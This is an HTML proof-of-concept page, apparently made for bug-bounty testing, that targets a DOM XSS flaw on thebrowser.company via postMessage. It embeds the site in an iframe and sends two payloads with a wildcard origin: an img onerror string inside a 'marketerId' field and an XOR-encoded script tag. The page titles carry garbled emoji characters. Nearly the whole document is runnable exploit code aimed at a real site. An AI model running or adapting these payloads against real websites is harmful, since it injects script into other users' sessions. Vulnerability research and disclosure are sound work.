<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>âœ… DOM XSS PoC â€“ thebrowser.company</title>
</head>
<body>
  <h2>âœ… PoC: DOM XSS via postMessage (final test)</h2>
  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border:2px solid #0f0;"></iframe>

  <script>
    const iframe = document.getElementById("target");

    iframe.onload = () => {
      console.log("âœ… iframe loaded");

      // 1. Structured payload (used in internal messaging)
      const structuredPayload = {
        message: "OB_SHOULD_SHOW_PICKER",
        content: {
          marketerId: [
            `<img src=x onerror=alert('XSS')>`
          ]
        }
      };

      // 2. XOR payload (if decoder is active)
      function xorEncode(str, key = 0x66) {
        const keyHex = key.toString(16).padStart(2, '0');
        return keyHex + Array.from(str).map(c =>
          (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
        ).join('');
      }

      const xorPayload = xorEncode("<script>alert('XSS from XOR')</script>");

      // âœ… Send both payloads
      iframe.contentWindow.postMessage(structuredPayload, "*");
      iframe.contentWindow.postMessage(xorPayload, "*");
      console.log("ðŸš€ Payloads sent via postMessage");
    };
  </script>
</body>
</html>
